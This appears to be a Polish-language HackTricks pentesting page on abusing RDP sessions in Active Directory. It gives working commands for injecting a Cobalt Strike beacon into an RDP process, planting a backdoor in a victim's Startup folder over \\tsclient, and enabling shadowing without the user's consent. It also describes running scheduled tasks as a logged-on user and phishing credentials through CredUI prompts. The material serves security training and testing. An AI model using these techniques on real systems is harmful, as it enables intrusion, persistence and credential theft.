# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Jeśli **external group** ma **RDP access** do dowolnego **komputera** w bieżącej domenie, **attacker** może **compromise** ten komputer i czekać na tego użytkownika.

Gdy ten użytkownik uzyska dostęp przez RDP, **attacker** może przejść do **sesji tego użytkownika** i nadużyć jego uprawnień w zewnętrznej domenie.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Sprawdź **inne sposoby kradzieży sesji przy użyciu innych narzędzi** [**na tej stronie.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Jeśli użytkownik **łączy się przez RDP z maszyną**, na której **czeka** **atakujący**, atakujący będzie mógł **wstrzyknąć beacon do sesji RDP użytkownika**, a jeśli **ofiara zamontowała swój dysk** podczas łączenia się przez RDP, **atakujący mógłby uzyskać do niego dostęp**.

W takim przypadku można po prostu **przejąć** **oryginalny komputer ofiary**, zapisując **backdoor** w **folderze startowym**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Jeśli jesteś **local admin** na hoście, na którym ofiara ma już **active RDP session**, możesz być w stanie **wyświetlać i kontrolować ten pulpit bez kradzieży hasła lub zrzucania LSASS**.<sup>[[1]](#references)</sup>

Zależy to od zasad **Remote Desktop Services shadowing** zapisanych w:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Interesujące wartości:

- `0`: Wyłączone
- `1`: `EnableInputNotify` (kontrola, wymagana zgoda użytkownika)
- `2`: `EnableInputNoNotify` (kontrola, **bez zgody użytkownika**)
- `3`: `EnableNoInputNotify` (tylko podgląd, wymagana zgoda użytkownika)
- `4`: `EnableNoInputNoNotify` (tylko podgląd, **bez zgody użytkownika**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Jest to szczególnie przydatne, gdy uprzywilejowany użytkownik połączony przez RDP pozostawił odblokowany pulpit, sesję KeePass, konsolę MMC, sesję przeglądarki lub otwartą powłokę administratora.

## Scheduled Tasks As Logged-On User

Jeśli jesteś **local admin**, a użytkownik docelowy jest **obecnie zalogowany**, Task Scheduler może uruchomić kod **jako ten użytkownik bez jego hasła**.<sup>[[1]](#references)[[4]](#references)</sup>

Dzięki temu istniejąca sesja logowania ofiary staje się mechanizmem wykonywania kodu:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notatki:

- Jeśli użytkownik **nie jest zalogowany**, Windows zwykle wymaga hasła do utworzenia zadania uruchamianego jako ten użytkownik.
- Jeśli użytkownik **jest zalogowany**, zadanie może ponownie użyć istniejącego kontekstu logowania.
- Jest to praktyczny sposób na wykonywanie działań GUI lub uruchamianie plików binarnych w sesji ofiary bez uzyskiwania dostępu do LSASS.

## Nadużycie monitu CredUI z sesji ofiary

Gdy możesz wykonywać kod **wewnątrz interaktywnego pulpitu ofiary** (na przykład za pośrednictwem **Shadow RDP** lub **zaplanowanego zadania uruchamianego jako ten użytkownik**), możesz wyświetlić **rzeczywisty monit poświadczeń Windows** za pomocą interfejsów API CredUI i przechwycić poświadczenia wprowadzone przez ofiarę.<sup>[[1]](#references)</sup>

Istotne interfejsy API:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typowy przebieg:

1. Uruchom plik binarny w sesji ofiary.
2. Wyświetl monit uwierzytelniania domenowego odpowiadający brandingowi bieżącej domeny.
3. Rozpakuj zwrócony bufor uwierzytelniania.
4. Zweryfikuj podane poświadczenia i opcjonalnie wyświetlaj monit ponownie, dopóki nie zostaną wprowadzone prawidłowe poświadczenia.

Jest to przydatne w przypadku **phishingu na hoście**, ponieważ monit jest renderowany przez standardowe interfejsy API Windows, a nie przez fałszywy formularz HTML.

## Żądanie PFX w kontekście ofiary

Ta sama metoda **scheduled-task-as-user** może zostać wykorzystana do zażądania **certyfikatu/PFX jako zalogowana ofiara**. Certyfikat ten może później posłużyć do **uwierzytelniania AD** jako ten użytkownik, całkowicie eliminując konieczność kradzieży hasła.<sup>[[1]](#references)[[5]](#references)</sup>

Przebieg wysokiego poziomu:

1. Uzyskaj uprawnienia **local admin** na hoście, na którym zalogowana jest ofiara.
2. Uruchom logikę rejestracji/eksportu jako ofiara za pomocą **scheduled task**.
3. Wyeksportuj wynikowy **PFX**.
4. Użyj PFX do uwierzytelniania PKINIT / uwierzytelniania AD opartego na certyfikacie.

Zobacz strony dotyczące AD CS, aby zapoznać się z dalszym nadużyciem:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
